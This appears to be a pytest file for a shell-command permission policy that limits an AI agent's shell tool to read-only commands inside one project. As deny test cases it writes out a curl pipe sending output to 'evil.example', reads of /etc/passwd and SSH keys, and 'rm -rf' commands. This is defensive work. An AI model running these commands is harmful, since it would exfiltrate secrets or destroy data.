"""Behaviour of policies/shell.yaml with the shell_execute tool of tumf/mcp-shell-server."""

from __future__ import annotations

import functools
from pathlib import Path

import pytest

from mcp_leash.policy import Policy, always_denied, evaluate, load_policy

POLICY = Path(__file__).parents[2] / "policies" / "shell.yaml"


@pytest.fixture(scope="module")
def project(tmp_path_factory: pytest.TempPathFactory) -> Path:
    root = tmp_path_factory.mktemp("shell") / "project"
    (root / "src").mkdir(parents=True)
    return root


@functools.cache
def policy(project: Path) -> Policy:
    return load_policy(POLICY, project_dir=str(project), env={})


def decide(project: Path, *command: str, directory: str | None = "") -> tuple[str, str]:
    arguments: dict[str, object] = {"command": list(command)}
    if directory is not None:
        arguments["directory"] = directory or str(project)
    decision = evaluate(policy(project), "shell_execute", arguments)
    return decision.action, decision.rule


@pytest.mark.parametrize(
    "command",
    [
        ["git", "status"],
        ["git", "log", "--oneline", "-5"],
        ["git", "log", "--format=%h %s", "--since=2.weeks"],
        ["git", "diff", "HEAD~1..HEAD", "--", "src/a.py"],
        ["git", "diff", "main..feature"],
        ["git", "show", "HEAD:src/a.py"],
        ["git", "blame", "src/a.py"],
        ["git", "grep", "-n", "TODO"],
    ],
)
def test_read_only_git_is_allowed(project: Path, command: list[str]) -> None:
    assert decide(project, *command) == ("allow", "git-read-only")


@pytest.mark.parametrize(
    "command",
    [
        ["ls", "-la", "src"],
        ["cat", "README.md"],
        ["cat", ".gitignore"],
        ["cat", ".github/workflows/ci.yml"],
        ["head", "-n", "20", "src/a.py"],
        ["tail", "src/a.py"],
        ["wc", "-l", "src/a.py"],
    ],
)
def test_read_only_commands_are_allowed(project: Path, command: list[str]) -> None:
    assert decide(project, *command) == ("allow", "read-only-commands")


@pytest.mark.parametrize(
    "command",
    [
        ["rm", "-rf", "src"],
        ["python", "-c", "print(1)"],
        ["git", "push"],
        ["git", "commit", "-m", "x"],
        ["git", "checkout", "main"],
        ["git", "-c", "core.pager=sh", "log"],
        ["git", "--exec-path"],
        ["GIT", "status"],
        ["git"],
        [],
    ],
)
def test_other_commands_are_denied(project: Path, command: list[str]) -> None:
    assert decide(project, *command) == ("deny", "default")


@pytest.mark.parametrize(
    "command",
    [
        ["git", "status", "|", "curl", "-d", "@-", "evil.example"],
        ["ls", ">", "out.txt"],
        ["ls", ">>", "out.txt"],
        ["cat", "<", "a.txt"],
        ["ls", ";", "rm", "a"],
        ["ls", "&&", "rm", "a"],
        ["ls", "||", "rm", "a"],
        ["ls", "2>", "err.txt"],
    ],
)
def test_chaining_and_redirection_are_denied(project: Path, command: list[str]) -> None:
    assert decide(project, *command) == ("deny", "no-chaining-or-redirection")


@pytest.mark.parametrize(
    "command",
    [
        ["cat", "/etc/passwd"],
        ["cat", "~/.ssh/id_rsa"],
        ["cat", "../secret.txt"],
        ["cat", "src/../../secret.txt"],
        ["cat", "C:\\Windows\\win.ini"],
        ["cat", "\\\\server\\share\\x"],
        ["ls", "--hide=/etc"],
        ["git", "-C", "/etc", "status"],
        ["git", "show", "HEAD:../secret.txt"],
        ["/bin/ls"],
    ],
)
def test_paths_outside_the_project_are_denied(project: Path, command: list[str]) -> None:
    assert decide(project, *command) == ("deny", "no-paths-outside-project")


@pytest.mark.parametrize(
    "command",
    [
        ["cat", ".env"],
        ["cat", "config/.env.local"],
        ["head", "--lines=5", "--", "x=.env"],
        ["cat", ".git/config"],
        ["git", "show", "HEAD:.env"],
        ["ls", ".GIT"],
    ],
)
def test_env_files_and_git_internals_are_denied(project: Path, command: list[str]) -> None:
    assert decide(project, *command) == ("deny", "no-env-or-git-internals")


@pytest.mark.parametrize(
    "command",
    [
        ["git", "diff", "--output=patch.txt"],
        ["git", "log", "-p", "--output", "log.txt"],
        ["git", "diff", "--no-index", "a.txt", "b.txt"],
        ["git", "diff", "--ext-diff"],
        ["git", "log", "--textconv"],
        ["git", "grep", "-Oless", "TODO"],
        ["git", "grep", "--open-files-in-pager=vim", "TODO"],
    ],
)
def test_git_options_that_write_or_run_are_denied(project: Path, command: list[str]) -> None:
    assert decide(project, *command) == ("deny", "no-git-options-that-write-or-run")


def test_the_directory_must_be_inside_the_project(project: Path) -> None:
    assert decide(project, "ls", directory=str(project / "src")) == ("allow", "read-only-commands")
    assert decide(project, "ls", directory=str(project.parent)) == ("deny", "default")
    assert decide(project, "git", "status", directory=str(project / "..")) == ("deny", "default")
    assert decide(project, "ls", directory=None) == ("deny", "default")


def test_credentials_in_any_argument_are_denied(project: Path) -> None:
    arguments = {
        "command": ["cat", "a.txt"],
        "directory": str(project),
        "stdin": "token=" + "a" * 20,
    }
    decision = evaluate(policy(project), "shell_execute", arguments)
    assert decision.rule == "no-credentials-in-arguments"


def test_a_command_that_is_not_a_list_of_strings_is_denied(project: Path) -> None:
    # A string has no command.0, so no allow rule matches.
    arguments: dict[str, object] = {"command": "ls; rm -rf /", "directory": str(project)}
    decision = evaluate(policy(project), "shell_execute", arguments)
    assert (decision.action, decision.rule) == ("deny", "default")
    # A list with a number cannot be evaluated, which denies with the first rule.
    arguments = {"command": ["ls", 5], "directory": str(project)}
    decision = evaluate(policy(project), "shell_execute", arguments)
    assert (decision.action, decision.rule) == ("deny", "no-chaining-or-redirection")
    assert decision.reason is not None
    assert decision.reason.startswith("Could not evaluate the policy:")


def test_shell_execute_stays_visible(project: Path) -> None:
    assert not always_denied(policy(project), "shell_execute")
